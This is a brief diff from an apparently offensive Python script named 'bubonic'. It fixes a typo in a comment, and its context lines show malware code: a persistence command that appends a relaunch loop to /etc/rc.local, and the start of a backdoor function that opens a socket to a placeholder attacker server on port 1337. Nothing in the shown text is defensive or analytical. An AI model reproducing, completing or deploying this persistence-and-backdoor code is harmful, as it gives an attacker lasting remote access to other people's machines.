@@ -13,7 +13,7 @@ try:
 				os.system("echo 'while true;do python /etc/init.d/bubonic; sleep 5; done' >> /etc/rc.local")
 
 	def backdoor():
-		ip = " " #INSER THE IP ADDRESS OF YOUR SERVER HERE
+		ip = " " #INSERT THE IP ADDRESS OF YOUR SERVER HERE
 		port = 1337
 
 		s = socket.socket()
